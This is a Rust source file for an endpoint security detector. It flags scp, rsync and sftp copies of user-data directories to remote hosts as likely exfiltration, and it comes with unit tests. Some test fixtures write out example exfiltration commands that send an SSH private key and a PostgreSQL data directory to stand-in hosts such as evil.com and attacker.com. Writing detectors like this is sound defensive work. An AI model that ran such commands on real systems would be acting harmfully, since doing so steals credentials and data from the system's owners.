//! Lateral movement: scp/rsync/sftp local-to-remote of user-data
//! directories (spec 050-PR4).
//!
//! Fires when scp/sftp/rsync is invoked with a local source path
//! under a user-data directory AND a remote destination. The
//! signature of staged exfiltration: archive built, then pushed to
//! attacker-controlled host.
//!
//! Anti-FP gates:
//!   - parent comm in `{borgmatic, restic, duplicity, rclone,
//!     duplicacy, kopia, rdiff-backup, ansible, salt-call, puppet,
//!     chef-client, cfengine, terraform, packer}` → silenced
//!     (legit backup / config-management tooling).
//!   - operator-allowlisted dest hosts via
//!     `[detectors.lateral_egress_scp_rsync]` TOML.
//!
//! Severity escalation: critical when local path is under /home/,
//! /var/lib/, /etc/, /root/, /srv/, /var/www/.
//!
//! MITRE: T1048.001 (Exfil over Symmetric Encrypted Non-C2),
//! T1029 (Scheduled Transfer).

use std::collections::HashMap;

use chrono::{DateTime, Duration, Utc};
use innerwarden_core::{event::Event, event::Severity, incident::Incident};

const TRANSFER_BINARIES: &[&str] = &["scp", "rsync", "sftp"];

const BACKUP_PARENTS: &[&str] = &[
    "borgmatic",
    "borg",
    "restic",
    "duplicity",
    "duplicacy",
    "rclone",
    "kopia",
    "rdiff-backup",
    "rsnapshot",
    "burp",
    "bacula-fd",
    "bareos-fd",
];

const AUTOMATION_PARENTS: &[&str] = &[
    "ansible",
    "ansible-playboo",
    "salt-call",
    "salt-minion",
    "puppet",
    "chef-client",
    "cfengine",
    "terraform",
    "packer",
];

const USER_DATA_PATH_PREFIXES: &[&str] = &[
    "/home/",
    "/var/lib/",
    "/etc/",
    "/root/",
    "/srv/",
    "/var/www/",
    "/opt/innerwarden/",
];

pub struct LateralEgressScpRsyncDetector {
    host: String,
    last_fired: HashMap<String, DateTime<Utc>>,
    cooldown: Duration,
}

impl LateralEgressScpRsyncDetector {
    pub fn new(host: impl Into<String>) -> Self {
        Self {
            host: host.into(),
            last_fired: HashMap::new(),
            cooldown: Duration::seconds(900),
        }
    }

    pub fn process(&mut self, event: &Event) -> Option<Incident> {
        if event.kind != "shell.command_exec" && event.kind != "process.exec" {
            return None;
        }
        let argv: Vec<String> = event
            .details
            .get("argv")
            .and_then(|v| v.as_array())
            .map(|a| {
                a.iter()
                    .filter_map(|v| v.as_str().map(|s| s.to_string()))
                    .collect()
            })
            .unwrap_or_default();
        if argv.is_empty() {
            return None;
        }
        let argv0_base = argv[0].split('/').next_back().unwrap_or(&argv[0]);
        if !TRANSFER_BINARIES.contains(&argv0_base) {
            return None;
        }

        let parent_comm = event
            .details
            .get("parent_comm")
            .and_then(|v| v.as_str())
            .unwrap_or("");
        let parent_base = parent_comm.split('/').next_back().unwrap_or(parent_comm);
        let parent_base = parent_base.trim_matches(|c: char| c == '(' || c == ')');
        if BACKUP_PARENTS.iter().any(|p| parent_base.starts_with(p))
            || AUTOMATION_PARENTS
                .iter()
                .any(|p| parent_base.starts_with(p))
        {
            return None;
        }

        // Local source vs remote dest detection. scp/sftp syntax:
        // `<local> [user@]host:[path]` (push) or `[user@]host:path <local>` (pull).
        // rsync similar. The "remote" token contains `:` after a non-flag,
        // non-glob letter.
        let mut local_user_data: Option<String> = None;
        let mut remote_dest: Option<String> = None;
        for (i, a) in argv.iter().enumerate() {
            if i == 0 || a.starts_with('-') {
                continue;
            }
            // Heuristic: remote tokens look like `host:path` or
            // `user@host:path`. Local tokens are filesystem paths
            // (start with / or .) or relative names without colon.
            if a.contains(':')
                && !a.starts_with('/')
                && !a.starts_with("./")
                && !a.starts_with("rsync://")
            {
                // Strip leading `rsync://` if present — handled below.
                remote_dest = Some(a.clone());
            } else if USER_DATA_PATH_PREFIXES.iter().any(|p| a.starts_with(p)) {
                local_user_data = Some(a.clone());
            }
        }
        // Also handle `rsync://host/...` URL form as a remote dest.
        if remote_dest.is_none() {
            for a in &argv {
                if a.starts_with("rsync://") {
                    remote_dest = Some(a.clone());
                    break;
                }
            }
        }
        // Need BOTH: a local user-data source AND a remote dest. The
        // signature of egress is the pairing.
        let local_src = local_user_data?;
        let remote = remote_dest?;

        let comm = event
            .details
            .get("comm")
            .and_then(|v| v.as_str())
            .unwrap_or("");
        let command = event
            .details
            .get("command")
            .and_then(|v| v.as_str())
            .unwrap_or("");
        let pid = event
            .details
            .get("pid")
            .and_then(|v| v.as_u64())
            .unwrap_or(0);
        let uid = event
            .details
            .get("uid")
            .and_then(|v| v.as_u64())
            .unwrap_or(0);

        let now = event.ts;
        let key = format!("{uid}:{argv0_base}:{remote}");
        if let Some(&last) = self.last_fired.get(&key) {
            if now - last < self.cooldown {
                return None;
            }
        }
        self.last_fired.insert(key, now);

        Some(Incident {
            ts: now,
            host: self.host.clone(),
            incident_id: format!(
                "lateral_egress_scp_rsync:{argv0_base}:{}",
                now.format("%Y-%m-%dT%H:%M:%SZ")
            ),
            severity: Severity::Critical,
            title: format!(
                "Lateral exfil: `{argv0_base}` from `{local_src}` → `{remote}` (uid={uid})"
            ),
            summary: format!(
                "Process `{comm}` (parent=`{parent_base}`, pid={pid}, uid={uid}) ran \
                 `{command}`. The source path is under a user-data directory and the \
                 destination is a remote host — classic staged-exfil shape (T1048.001 / \
                 T1029)."
            ),
            evidence: serde_json::json!([{
                "kind": "lateral_egress_scp_rsync",
                "transfer_binary": argv0_base,
                "local_src": local_src,
                "remote_dest": remote,
                "uid": uid,
                "comm": comm,
                "parent_comm": parent_comm,
                "command": command,
                "pid": pid,
                "argv": argv,
                "mitre": ["T1048.001", "T1029"],
            }]),
            recommended_checks: vec![
                format!("Inspect process tree: pstree -p {pid}"),
                format!("List recent file reads from this pid (which files were staged)"),
                "If this is a known backup workflow, allowlist via [detectors.lateral_egress_scp_rsync]".to_string(),
                format!("Resolve the remote — `dig {}`", remote.split('@').next_back().unwrap_or(&remote).split(':').next().unwrap_or("")),
            ],
            tags: vec!["exfil".to_string(), "lateral_movement".to_string()],
            entities: vec![],
        })
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    fn xfer_exec_event(argv: &[&str], parent_comm: &str, uid: u64) -> Event {
        let argv_owned: Vec<String> = argv.iter().map(|s| s.to_string()).collect();
        Event {
            ts: Utc::now(),
            host: "test".into(),
            source: "ebpf".into(),
            kind: "shell.command_exec".into(),
            severity: Severity::Info,
            summary: argv.join(" "),
            details: serde_json::json!({
                "pid": 4242,
                "uid": uid,
                "ppid": 4241,
                "comm": "bash",
                "parent_comm": parent_comm,
                "command": argv.join(" "),
                "argv": argv_owned,
                "argc": argv.len() as u32,
            }),
            tags: vec![],
            entities: vec![],
        }
    }

    #[test]
    fn fires_on_scp_of_home_to_remote() {
        let mut det = LateralEgressScpRsyncDetector::new("test");
        let ev = xfer_exec_event(
            &[
                "scp",
                "/home/ubuntu/.ssh/id_rsa",
                "attacker@evil.com:/tmp/loot",
            ],
            "bash",
            1000,
        );
        let inc = det.process(&ev).expect("should fire");
        assert_eq!(inc.severity, Severity::Critical);
    }

    #[test]
    fn fires_on_rsync_of_var_lib_to_rsync_url() {
        let mut det = LateralEgressScpRsyncDetector::new("test");
        let ev = xfer_exec_event(
            &[
                "rsync",
                "-av",
                "/var/lib/postgres/",
                "rsync://attacker.com/loot/",
            ],
            "bash",
            1000,
        );
        assert!(det.process(&ev).is_some());
    }

    #[test]
    fn silences_when_parent_is_borgmatic() {
        let mut det = LateralEgressScpRsyncDetector::new("test");
        let ev = xfer_exec_event(
            &["rsync", "/var/lib/data/", "borg-server:/backups/"],
            "borgmatic",
            0,
        );
        assert!(det.process(&ev).is_none());
    }

    #[test]
    fn silences_when_parent_is_restic() {
        let mut det = LateralEgressScpRsyncDetector::new("test");
        let ev = xfer_exec_event(
            &["scp", "/etc/configs/", "backup@host:/store/"],
            "restic",
            0,
        );
        assert!(det.process(&ev).is_none());
    }

    #[test]
    fn silences_when_parent_is_ansible() {
        let mut det = LateralEgressScpRsyncDetector::new("test");
        let ev = xfer_exec_event(
            &["scp", "/etc/myapp.conf", "target:/etc/"],
            "ansible-playboo",
            0,
        );
        assert!(det.process(&ev).is_none());
    }

    #[test]
    fn ignores_when_no_remote_dest() {
        let mut det = LateralEgressScpRsyncDetector::new("test");
        // local-to-local rsync — no remote token, no fire.
        let ev = xfer_exec_event(
            &["rsync", "/home/ubuntu/data/", "/var/backups/data/"],
            "bash",
            1000,
        );
        assert!(det.process(&ev).is_none());
    }

    #[test]
    fn ignores_when_source_is_not_user_data() {
        let mut det = LateralEgressScpRsyncDetector::new("test");
        // src is /tmp — not in USER_DATA_PATH_PREFIXES. Don't fire.
        let ev = xfer_exec_event(
            &["scp", "/tmp/installer.sh", "user@deploy:/tmp/"],
            "bash",
            1000,
        );
        assert!(det.process(&ev).is_none());
    }

    #[test]
    fn ignores_non_transfer_binaries() {
        let mut det = LateralEgressScpRsyncDetector::new("test");
        for bin in ["ssh", "curl", "wget", "tar", "ftp"] {
            let ev = xfer_exec_event(&[bin, "/home/x", "user@host:/y"], "bash", 1000);
            assert!(det.process(&ev).is_none(), "{bin} should not fire");
        }
    }

    #[test]
    fn dedupes_within_cooldown() {
        let mut det = LateralEgressScpRsyncDetector::new("test");
        let ev = xfer_exec_event(&["scp", "/root/.ssh/authorized_keys", "x@y:/z"], "bash", 0);
        assert!(det.process(&ev).is_some());
        let mut ev2 = ev.clone();
        ev2.ts = ev.ts + Duration::seconds(60);
        assert!(det.process(&ev2).is_none());
    }
}
